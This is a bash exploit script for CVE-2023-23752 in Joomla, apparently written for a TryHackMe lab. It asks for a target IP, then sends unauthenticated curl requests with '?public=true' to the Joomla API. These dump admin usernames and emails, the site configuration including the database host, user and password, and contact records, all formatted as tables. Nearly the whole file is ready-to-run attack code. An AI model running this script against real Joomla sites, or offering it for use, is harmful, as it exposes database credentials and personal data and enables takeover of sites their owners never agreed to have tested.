#!/bin/bash
# Developer: Aureum01
# Tryhackme: Celebrus
# CVE-2023-23752 Joomla Authentication Bypass
# CVE Details: https://nvd.nist.gov/vuln/detail/CVE-2023-23752
# Vulnerability Analysis: https://vulncheck.com/blog/joomla-for-rce
# Documentation: https://docs.joomla.org/J4.x:Joomla_Core_APIs#Banners_2

# Define colors
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print a separator line
print_separator() {
    echo -e "${CYAN}========================================${NC}"
}

print_separator
# Prompt the user for their IP address
read -p "Please enter the target IP address: " IP_ADDRESS

BASE_URL="http://$IP_ADDRESS/api/index.php/v1"

loading_indicator() {
    local chars="/-\+|^"
    for (( i=0; i<5; i++ )); do
        for (( j=0; j<${#chars}; j++ )); do
            echo -ne "${YELLOW}${chars:$j:1}" "\r"
            sleep 0.1
        done
    done
    echo -ne "${GREEN}Done\n"
}

print_loading_line() {
    echo -e "${NC}----------------------------------------${NC}"
}

print_separator
echo -e "${YELLOW}Admin User's Details:${NC}"
loading_indicator
print_loading_line

# Execute the curl request with jq filtering and format the output into a table
# Red is ify so I left it out until I figure it out
curl -s "$BASE_URL/users?public=true" | jq -r '.data[] | ["Type", .type, "ID", .id, "Name", .attributes.name, "Username", .attributes.username, "Email", .attributes.email, "Register Date", .attributes.registerDate, "Last Visit Date", .attributes.lastvisitDate, "Group Names", .attributes.group_names] | @tsv' | while IFS=$'\t' read -r label1 value1 label2 value2 label3 value3 label4 value4 label5 value5 label6 value6 label7 value7 label8 value8; do
    printf "${GREEN}%-15s: %-30s\n" "${label1}" "${value1}"
    printf "${GREEN}%-15s: %-30s\n" "${label2}" "${value2}"
    printf "${GREEN}%-15s: %-30s\n" "${label3}" "${value3}"
    printf "${GREEN}%-15s: %-30s\n" "${label4}" "${value4}"
    printf "${GREEN}%-15s: %-30s\n" "${label5}" "${value5}"
    printf "${GREEN}%-15s: %-30s\n" "${label6}" "${value6}"
    printf "${GREEN}%-15s: %-30s\n" "${label7}" "${value7}"
    printf "${GREEN}%-15s: %-30s\n" "${label8}" "${value8}"
    echo -e "${CYAN}----------------------------------------${NC}"
done

# Application Configuration Details
print_separator
echo -e "${YELLOW}Application Configuration Details:${NC}"
loading_indicator
print_loading_line

# Curl with jq filtering and format the output into a table
curl -s "$BASE_URL/config/application?public=true" | jq -r '
  .data | group_by(.id) | 
  map({
    type: .[0].type,
    id: .[0].id,
    offline: (map(.attributes.offline) | add // null),
    offline_message: (map(.attributes.offline_message) | add // null),
    sitename: (map(.attributes.sitename) | add // null),
    editor: (map(.attributes.editor) | add // null),
    debug_lang: (map(.attributes.debug_lang) | add // null),
    debug_lang_const: (map(.attributes.debug_lang_const) | add // null),
    dbtype: (map(.attributes.dbtype) | add // null),
    host: (map(.attributes.host) | add // null),
    user: (map(.attributes.user) | add // null),
    password: (map(.attributes.password) | add // null),
    db: (map(.attributes.db) | add // null),
    dbprefix: (map(.attributes.dbprefix) | add // null),
    dbencryption: (map(.attributes.dbencryption) | add // null),
    dbsslverifyservercert: (map(.attributes.dbsslverifyservercert) | add // null)
  }) | .[] | 
  ["Type", .type, "ID", .id, "Offline", .offline, "Offline Message", .offline_message, "Site Name", .sitename, "Editor", .editor, "Debug Lang", .debug_lang, "Debug Lang Const", .debug_lang_const, "DB Type", .dbtype, "Host", .host, "User", .user, "Password", .password, "DB", .db, "DB Prefix", .dbprefix, "DB Encryption", .dbencryption, "DB SSL Verify Server Cert", .dbsslverifyservercert] | @tsv' | while IFS=$'\t' read -r label1 value1 label2 value2 label3 value3 label4 value4 label5 value5 label6 value6 label7 value7 label8 value8 label9 value9 label10 value10 label11 value11 label12 value12 label13 value13 label14 value14 label15 value15 label16 value16 label17 value17; do
    printf "${GREEN}%-20s: %-30s\n" "${label1}" "${value1}"
    printf "${GREEN}%-20s: %-30s\n" "${label2}" "${value2}"
    printf "${GREEN}%-20s: %-30s\n" "${label3}" "${value3}"
    printf "${GREEN}%-20s: %-30s\n" "${label4}" "${value4}"
    printf "${GREEN}%-20s: %-30s\n" "${label5}" "${value5}"
    printf "${GREEN}%-20s: %-30s\n" "${label6}" "${value6}"
    printf "${GREEN}%-20s: %-30s\n" "${label7}" "${value7}"
    printf "${GREEN}%-20s: %-30s\n" "${label8}" "${value8}"
    printf "${GREEN}%-20s: %-30s\n" "${label9}" "${value9}"
    printf "${GREEN}%-20s: %-30s\n" "${label10}" "${value10}"
    printf "${GREEN}%-20s: %-30s\n" "${label11}" "${value11}"
    printf "${GREEN}%-20s: %-30s\n" "${label12}" "${value12}"
    printf "${GREEN}%-20s: %-30s\n" "${label13}" "${value13}"
    printf "${GREEN}%-20s: %-30s\n" "${label14}" "${value14}"
    printf "${GREEN}%-20s: %-30s\n" "${label15}" "${value15}"
    printf "${GREEN}%-20s: %-30s\n" "${label16}" "${value16}"
    printf "${GREEN}%-20s: %-30s\n" "${label17}" "${value17}"
    echo -e "${CYAN}----------------------------------------${NC}"
done

print_separator


# Curl request to a normal api endpoint
# {"errors":[{"title":"Forbidden"}]}
echo -e "${YELLOW}API Authorization Check:${NC}"
loading_indicator
print_loading_line

# Execute the curl request with jq filtering and format the output into a table
curl -s "$BASE_URL/conflict/application" | jq -r '.errors[] | ["Title", .title] | @tsv' | while IFS=$'\t' read -r label1 value1; do
    printf "${GREEN}%-15s: %-30s\n" "${label1}" "${value1}"
    echo -e "${CYAN}----------------------------------------${NC}"
done

print_separator

# Contact Details
print_separator
echo -e "${YELLOW}Contact Details:${NC}"
loading_indicator
print_loading_line

curl -s "$BASE_URL/contacts/1?public=true" | jq -r '
  .data | 
  {
    "Type": .type,
    "ID": .id,
    "Name": .attributes.name,
    "Alias": .attributes.alias,
    "Address": .attributes.address,
    "Suburb": .attributes.suburb,
    "State": .attributes.state,
    "Country": .attributes.country,
    "Postcode": .attributes.postcode,
    "Telephone": .attributes.telephone,
    "Fax": .attributes.fax,
    "Misc": .attributes.misc,
    "Image": .attributes.image,
    "Email To": .attributes.email_to,
    "User ID": .attributes.user_id,
    "Access": .attributes.access,
    "Webpage": .attributes.webpage,
    "Created": .attributes.created,
    "Created By Alias": .attributes.created_by_alias,
    "Modified": .attributes.modified,
    "Metakey": .attributes.metakey,
    "Version": .attributes.version,
    "Tags": (.attributes.tags | tostring)
  } | 
  [
    "Type", .Type,
    "ID", .ID,
    "Name", .Name,
    "Alias", .Alias,
    "Address", .Address,
    "Suburb", .Suburb,
    "State", .State,
    "Country", .Country,
    "Postcode", .Postcode,
    "Telephone", .Telephone,
    "Fax", .Fax,
    "Misc", .Misc,
    "Image", .Image,
    "Email To", .Email_To,
    "User ID", .User_ID,
    "Access", .Access,
    "Webpage", .Webpage,
    "Created", .Created,
    "Created By Alias", .Created_By_Alias,
    "Modified", .Modified,
    "Metakey", .Metakey,
    "Version", .Version,
    "Tags", .Tags
  ] | @tsv' | while IFS=$'\t' read -r label1 value1 label2 value2 label3 value3 label4 value4 label5 value5 label6 value6 label7 value7 label8 value8 label9 value9 label10 value10 label11 value11 label12 value12 label13 value13 label14 value14 label15 value15 label16 value16 label17 value17 label18 value18 label19 value19 label20 value20 label21 value21 label22 value22; do
    printf "${GREEN}%-20s: %-30s\n" "${label1}" "${value1}"
    printf "${GREEN}%-20s: %-30s\n" "${label2}" "${value2}"
    printf "${GREEN}%-20s: %-30s\n" "${label3}" "${value3}"
    printf "${GREEN}%-20s: %-30s\n" "${label4}" "${value4}"
    printf "${GREEN}%-20s: %-30s\n" "${label5}" "${value5}"
    printf "${GREEN}%-20s: %-30s\n" "${label6}" "${value6}"
    printf "${GREEN}%-20s: %-30s\n" "${label7}" "${value7}"
    printf "${GREEN}%-20s: %-30s\n" "${label8}" "${value8}"
    printf "${GREEN}%-20s: %-30s\n" "${label9}" "${value9}"
    printf "${GREEN}%-20s: %-30s\n" "${label10}" "${value10}"
    printf "${GREEN}%-20s: %-30s\n" "${label11}" "${value11}"
    printf "${GREEN}%-20s: %-30s\n" "${label12}" "${value12}"
    printf "${GREEN}%-20s: %-30s\n" "${label13}" "${value13}"
    printf "${GREEN}%-20s: %-30s\n" "${label14}" "${value14}"
    printf "${GREEN}%-20s: %-30s\n" "${label15}" "${value15}"
    printf "${GREEN}%-20s: %-30s\n" "${label16}" "${value16}"
    printf "${GREEN}%-20s: %-30s\n" "${label17}" "${value17}"
    printf "${GREEN}%-20s: %-30s\n" "${label18}" "${value18}"
    printf "${GREEN}%-20s: %-30s\n" "${label19}" "${value19}"
    printf "${GREEN}%-20s: %-30s\n" "${label20}" "${value20}"
    printf "${GREEN}%-20s: %-30s\n" "${label21}" "${value21}"
    printf "${GREEN}%-20s: %-30s\n" "${label22}" "${value22}"
    echo -e "${CYAN}----------------------------------------${NC}"
done

print_separator
